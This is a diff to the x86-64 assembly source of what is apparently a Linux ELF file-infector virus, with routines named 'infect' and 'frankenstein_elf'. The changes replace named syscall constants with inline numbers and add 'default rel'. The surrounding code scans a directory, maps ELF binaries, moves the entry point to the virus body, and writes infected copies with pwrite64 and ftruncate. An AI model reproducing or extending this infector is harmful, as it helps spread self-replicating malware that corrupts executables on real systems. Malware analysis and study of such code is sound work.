@@ -249,7 +249,7 @@ BITS 64
 
 ;
 ; r14 + 200 = local filename (saved from dirent.d_nameq)
-; r14 + 500 = 
+; r14 + 500 = # of dirent entries returned from getdents64 syscall 
 ;
 ; r14 + 600 = 	struc linuxdirent
 ; r14 + 600			.d_ino:			resq	1
@@ -330,23 +330,23 @@ BITS 64
 section .data
 
 ;x64 syscall reference
-
-SYS_READ 		equ 0x0
-SYS_WRITE 		equ 0x1
-SYS_OPEN 		equ 0x2
-SYS_CLOSE 		equ 0x3
-SYS_FSTAT 		equ 0x5
-SYS_LSEEK 		equ 0x8
-SYS_MMAP 		equ 0x9
-SYS_MUNMAP		equ 0xB
-;SYS_PREAD64 	equ 0x11
-;SYS_PWRITE64 	equ 0x12
-;SYS_EXIT		equ 0x3c
-SYS_FTRUNCATE	equ 0x4d
-SYS_GETDENTS64	equ 0x4e
-SYS_CREAT		equ 0x55
-
-
+;
+;SYS_READ 		equ 0x0
+;SYS_WRITE 		equ 0x1
+;SYS_OPEN 		equ 0x2
+;SYS_CLOSE 		equ 0x3
+;SYS_FSTAT 		equ 0x5
+;SYS_LSEEK 		equ 0x8
+;SYS_MMAP 		equ 0x9
+;SYS_MUNMAP		equ 0xB
+;;SYS_PREAD64 	equ 0x11
+;;SYS_PWRITE64 	equ 0x12
+;;SYS_EXIT		equ 0x3c
+;SYS_FTRUNCATE	equ 0x4d
+;SYS_GETDENTS64	equ 0x4e
+;SYS_CREAT		equ 0x55
+;
+;
 PAGESIZE dd 4096	
 
 
@@ -484,9 +484,9 @@ STDOUT			equ 0x1
 
 MAX_RDENT_BUF_SIZE equ 0x800
 
-
-section .text
 global _start
+default rel
+section .text
 _start:
 	jmp vxstart
 	;db 0x78,0x6f,0x78,0x6f
@@ -539,7 +539,7 @@ process_dirents:
 	mov rdi, rax
 	lea rsi, [r14 + 600] 	;r14 + 600 = location on stack where we'll save our dirent struct
 	mov rdx, MAX_RDENT_BUF_SIZE
-	mov rax, SYS_GETDENTS64
+	mov rax, 0x4e ;SYS_GETDENTS64
 	syscall
 
 	mov r8, rax						;save # of dirent entries in r8
@@ -551,7 +551,7 @@ process_dirents:
 ;; 	returns: 0 on success (-1 on error)
 ;****************************************************************************************
 	mov rdi, r9
-	mov rax, SYS_CLOSE
+	mov rax, 0x3 ;SYS_CLOSE
 	syscall
 	
 	xor rcx, rcx	
@@ -574,20 +574,21 @@ process_dirents:
 ;	lea r13, [r14 + 200]
 ;	call _write
 ;
-_write:
-		xor rsi, rsi
-		mov rdx, r12
-		mov rsi, r13
-		mov rdi, STDOUT
-		mov rax, SYS_WRITE
-		syscall
-		ret
+;_write:
+;		xor rsi, rsi
+;		mov rdx, r12
+;		mov rsi, r13
+;		mov rdi, STDOUT
+;		;mov rax, 0x1 ;SYS_WRITE
+;		mov rax, 0x1 ;0x1 ;SYS_WRITE 
+;		syscall
+;		ret
 ;	
 ;printteststr:
 ;		lea rsi, teststr
 ;		mov rdi, STDOUT
 ;		mov rdx, teststrlen
-;		mov rax, SYS_WRITE
+;		mov rax, 0x1 ;SYS_WRITE
 ;		syscall
 ;		jmp _restore		
 ;****************************************************************************************
@@ -617,7 +618,8 @@ check_file:
 		;mov rsi, OPEN_RDWR 				;flags - read/write in rsi
 		mov rsi, 0x2 						;flags - read/write in rsi
 		xor rdx, rdx						;mode - 0
-		mov rax, SYS_OPEN
+		;mov rax, SYS_OPEN
+		mov rax, 0x2		;SYS_OPEN ==0x2
 		syscall
 
 		cmp rax, 0
@@ -668,7 +670,7 @@ check_file:
 	get_filestat:
 		lea rsi, [r14]				;size for mmap == e_shoff + (e_shnum * e_shentsize)
 		mov rdi, r8 				;retrieve size from filestat struct with an fstat syscall
-		mov rax, SYS_FSTAT
+		mov rax, 0x5 ;SYS_FSTAT
 		syscall
 
 	
@@ -681,7 +683,7 @@ check_file:
 		;mov r10, MAP_PRIVATE	;fd is already in r8 so we don't need to set that reg again
 		mov r10, 0x2			;fd is already in r8 so we don't need to set that reg again
 		xor r9, r9				;offset of 0 within file == start of file, obv	
-		mov rax, SYS_MMAP
+		mov rax, 0x9 ;SYS_MMAP
 		syscall
 		
 		cmp rax, 0
@@ -694,7 +696,7 @@ check_file:
 
 	close_curr_file:
 		mov rdi, r9
-		mov rax, SYS_CLOSE
+		mov rax, 0x3 ;SYS_CLOSE
 		syscall
 	
 		pop rax
@@ -749,7 +751,7 @@ check_file:
 	checknext:
 		mov rdi, fd
 		mov rsi, [r14 + 48] 			;filestat.st_size
-		mov rax, SYS_MUNMAP
+		mov rax, 0xB ;SYS_MUNMAP
 		syscall
 		
 		pop rcx
@@ -824,7 +826,7 @@ check_file:
 payload:
 	pop rsi
 	mov rdx, payload_len
-	mov rax, SYS_WRITE
+	mov rax, 0x1 			;SYS_WRITE
 	mov rdi, STDOUT
 	syscall
 	
@@ -902,17 +904,12 @@ infect:
 	check_phdrs:
 		.phdr_loop:
 			push rcx
-			;cmp word [r13 + r12], PT_LOAD					;elf_phdr.p_type offset	
-			cmp word [r13 + r12], 0x1						;elf_phdr.p_type offset	
+			cmp word [r13 + r12], 0x1			;check elf_phdr.p_type offset for type PT_LOAD	
 			jne .mod_subsequent_phdr
 			.mod_curr_header:
 				;cmp dword [r13 + r12 + 4], PFLAGS_RX		;elf_phdr.p_flags offset
 				cmp dword [r13 + r12 + 4], 0x5				;elf_phdr.p_flags offset
 				je .mod_phdr_text_segment			
-				;cmp dword [r13 + r12 + 4], PFLAGS_RW		;elf_phdr.p_flags offset
-				;cmp dword [r13 + r12 + 4], 0x6				;elf_phdr.p_flags offset
-				;je .mod_phdr_data_segment			
-				;jmp .mod_other_ptload_phdr
 				jmp .mod_subsequent_phdr
 				.mod_phdr_text_segment:			
 					mov r10, [r13 + r12 + 16] 	;entry virtual addr (evaddr) = phdr->p_vaddr + phdr->p_filesz
@@ -921,7 +918,6 @@ infect:
 														;new entry point of infected file = evaddr + ventry
 					mov qword [r13 + 24], r10			; update ELF header entry point to point to virus code start
 					mov r10, [r13 + r12 + 8]			;elf_phdr.p_offset  
-					;mov dword [hosttext_start], r10d
 					add r10, [r13 + r12 + 32]			;elf_phdr.p_filesz offset
 					mov dword [vxoffset], r10d
 					add qword [r13 + r12 + 32], vlen+6	;elf_phdr.p_filesz offset
@@ -1093,7 +1089,7 @@ frankenstein_elf:
 	mov [r14 + 0x800], rax
 	lea rdi, [r14 + 0x800]			;name of file in rdi
 	mov rsi, 0777o					;mode - 777 (file perms for new file)
-	mov rax, SYS_CREAT				;(O_CREAT | O_TRUNC | O_WRONLY)
+	mov rax, 0x55 ;SYS_CREAT				;(O_CREAT | O_TRUNC | O_WRONLY)
 	syscall
 	
 	mov r9, rax
@@ -1113,7 +1109,7 @@ frankenstein_elf:
 	.write_host_ehdr_phdrs_textsegment:	
 		mov rdi, r9
 		lea rsi, [r13]					;r13 contains pointer to mmap'd file
-		mov rax, SYS_WRITE
+		mov rax, 0x1 					;SYS_WRITE
 		syscall
 
 	; pwrite64(int fd, const void* buf, size_t count, off_t offset)
@@ -1144,7 +1140,6 @@ frankenstein_elf:
 		lea rsi, [r14+ 180]
 		mov r10d, dword [vxoffset]
 		add r10d, dword vlen				;file offset adjusted to vxoffset+vlen
-		;mov rax, SYS_PWRITE64
 		mov rax, 0x12						;SYS_PWRITE64 	equ 0x12
 		syscall
 		
@@ -1186,7 +1181,7 @@ frankenstein_elf:
 		;;mov dword [vx_padding_size], eax
 		mov dword [vx_padding_size], esi
 ;		mov esi, eax
-		mov rax, SYS_FTRUNCATE
+		mov rax, 0x4d ;SYS_FTRUNCATE
 		syscall
 ;		jmp .close_temp
 
@@ -1218,12 +1213,12 @@ frankenstein_elf:
 	.munmap_file_work_area:
 		lea rdi, [r13]			;munmap file from work area
 		mov rsi, [r14 + 48] 	;filestat.st_size
-		mov rax, SYS_MUNMAP
+		mov rax, 0xB ;SYS_MUNMAP
 		syscall
 
 	.close_temp:		
 		mov rdi, r9				;close temp file
-		mov rax, SYS_CLOSE
+		mov rax, 0x3 			;SYS_CLOSE
 		syscall
 
 
@@ -1237,6 +1232,7 @@ _restore:
 	mov rsp, rbp
 	pop rbp
 
+;PAGESIZE: dd 4096	
 
 vlen equ $-_start
 _end:
